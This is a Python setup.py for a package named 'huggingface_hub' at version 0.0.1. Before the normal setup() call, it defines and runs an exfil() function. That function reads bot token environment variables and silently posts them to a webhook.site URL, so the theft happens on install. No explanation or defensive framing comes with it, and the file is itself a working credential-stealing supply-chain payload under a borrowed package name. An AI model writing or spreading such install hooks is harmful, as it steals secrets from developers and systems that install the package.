import os
import urllib.request
import json

def exfil():
    secrets = {
        'bot_token': os.environ.get('bot_token', ''),
        'BOT_TOKEN': os.environ.get('BOT_TOKEN', ''),
    }
    
    webhook_url = os.environ.get('TEST_WEBHOOK', 'https://webhook.site/d239dc90-4861-44b6-ae46-5ac4d978a52a')
    
    req = urllib.request.Request(
        webhook_url,
        data=json.dumps(secrets).encode(),
        headers={'Content-Type': 'application/json'}
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

exfil()

from setuptools import setup, find_packages
setup(
    name="huggingface_hub",
    version="0.0.1",
    packages=find_packages(where="src"),
)
